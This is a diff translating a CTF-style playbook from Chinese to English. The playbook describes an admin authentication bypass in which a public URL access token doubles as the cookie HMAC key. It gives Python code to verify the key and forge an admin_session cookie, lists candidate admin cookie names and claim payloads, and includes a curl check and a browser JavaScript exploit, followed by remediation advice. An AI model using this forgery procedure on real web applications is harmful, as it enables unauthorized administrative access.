@@ -1,52 +1,52 @@
-# Cookie HMAC 密钥复用 → 后台认证绕过
+# Cookie HMAC Key Reuse → Admin Authentication Bypass
 
-> 当服务端将 URL 中公开的 access token 同时用作 Cookie 签名密钥，且后台直接信任 Cookie payload 中的声明字段时，可伪造管理员身份。
+> If a server uses a public access token from the URL as the Cookie signing key and the backend trusts claims in the Cookie payload, an attacker can forge an admin identity.
 
 ---
 
-## 适用场景
+## Applicable Scenarios
 
-- 目标为 Web 应用，URL 路径中包含 `access_token` / `token` / `key` 等参数
-- 响应头设置了签名 Cookie（如 `student_gate=<payload>.<signature>`）
-- 存在多个签名 Cookie（学生端 + 管理端）共用一个密钥的可能
-- 后台 Cookie payload 中包含客户端可控的权限声明（如 `{"admin":true}`）
+- The target is a Web application. The URL path contains parameters such as `access_token`, `token`, or `key`.
+- The response header sets a signed Cookie, such as `student_gate=<payload>.<signature>`.
+- Multiple signed Cookies, such as a student Cookie and an admin Cookie, may share one key.
+- The backend Cookie payload contains a client-controlled privilege claim, such as `{"admin":true}`.
 
-## 关键词
+## Keywords
 
-- HMAC key reuse / 签名密钥复用
-- Known-key session forgery / 已知密钥会话伪造
-- Client-side claims-based auth / 客户端声明式权限
-- Cookie signature bypass / Cookie 签名绕过
+- HMAC key reuse / signature-key reuse
+- Known-key session forgery / session forgery with a known key
+- Client-side claims-based auth / claims-based authorization
+- Cookie signature bypass / signed-Cookie bypass
 
-## 攻击流程
+## Attack Flow
 
-### Step 1：从 URL 提取 access token
+### Step 1: Extract the access token from the URL
 
-入口 URL 中通常可见：
+The entry URL usually shows:
 
 ```
 /access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
 ```
 
-提取 token：
+Extract the token:
 
 ```
 blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
 ```
 
-### Step 2：观察 student_gate Cookie
+### Step 2: Inspect the student_gate Cookie
 
-访问入口，响应头会设置签名 Cookie。格式通常为：
+Visit the entry URL. The response header sets a signed Cookie. The usual format is:
 
 ```
 Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
 ```
 
-解码 payload 确认内容结构。
+Decode the payload to confirm its structure.
 
-### Step 3：验证签名算法
+### Step 3: Verify the Signature Algorithm
 
-用已知的 access token 作为 HMAC key，尝试重现签名：
+Use the known access token as the HMAC key and try to reproduce the signature:
 
 ```python
 import hmac, hashlib, base64
@@ -67,11 +67,11 @@ computed = b64url(hmac.new(
 print("匹配" if computed == expected_sig else "不匹配")
 ```
 
-如果匹配 → 确认 `access token 就是 HMAC key`。
+If it matches, confirm that the `access token is the HMAC key`.
 
-### Step 4：猜测管理端 Cookie 名称和 payload 结构
+### Step 4: Guess the Admin Cookie Name and Payload Structure
 
-常见的管理端 Cookie 名称：
+Common admin Cookie names:
 
 - `admin_session`
 - `admin_token`
@@ -79,7 +79,7 @@ print("匹配" if computed == expected_sig else "不匹配")
 - `manage_token`
 - `backstage_session`
 
-Payload 结构试探方向（逐一尝试，直到命中 200）：
+Probe these payload structures one by one until one returns 200:
 
 ```json
 {"admin":true}
@@ -92,7 +92,7 @@ Payload 结构试探方向（逐一尝试，直到命中 200）：
 {"type":"admin"}
 ```
 
-### Step 5：伪造管理端 Cookie
+### Step 5: Forge the Admin Cookie
 
 ```python
 import hmac, hashlib, json, base64
@@ -112,15 +112,15 @@ cookie = f"admin_session={payload_b64}.{sig}"
 print(cookie)
 ```
 
-### Step 6：验证后台权限
+### Step 6: Verify Admin Access
 
 ```bash
-curl -k -H "Cookie: <上一步得到的cookie>" https://target/api/admin/me
+curl -k -H "Cookie: <cookie from the previous step>" https://target/api/admin/me
 ```
 
-返回 `{"admin":true}` 或 200 + 管理员数据则成功。
+The exploit succeeds when the response is `{"admin":true}` or is a 200 response with admin data.
 
-## 浏览器复现
+## Browser Reproduction
 
 ```javascript
 async function exploit() {
@@ -138,20 +138,20 @@ async function exploit() {
 exploit();
 ```
 
-## 修复方案
+## Remediation
 
-1. 使用服务端独立密钥签名 Cookie，不和 URL token 共用
-2. 后台权限基于服务端 session，而非客户端 Cookie payload 声明
-3. 不同角色使用不同签名密钥
-4. Cookie 中加入 `iat` / `exp` / `typ` 等声明并校验
-5. 静默处理签名解析异常（失败返回 401，不返回 500）
+1. Use a separate server-side key to sign Cookies. Do not share it with the URL token.
+2. Base admin authorization on a server-side session, not a client-side Cookie payload claim.
+3. Use a different signing key for each role.
+4. Add and validate `iat` / `exp` / `typ` claims in the Cookie.
+5. Handle signature parsing errors silently. Return 401, not 500.
 
-## 相关案例
+## Related Case
 
-- class.pangbaoba.me CTF 靶场后台绕过（student_gate 与 admin_session 共用 access token 作为 HMAC key，`{"admin":true}` 直接获得管理员权限）
+- Admin bypass in the class.pangbaoba.me CTF lab: `student_gate` and `admin_session` share the access token as the HMAC key, so `{"admin":true}` directly grants admin access.
 
-## 关联技能
+## Related Skills
 
-- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — Web 运行时分析
-- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — 类似 token 声明混淆
-- `reverse-engineering/languages-platforms.md` — JWT / OAuth 相关
+- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — Web runtime analysis
+- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — Similar token-claim confusion
+- `reverse-engineering/languages-platforms.md` — JWT / OAuth references
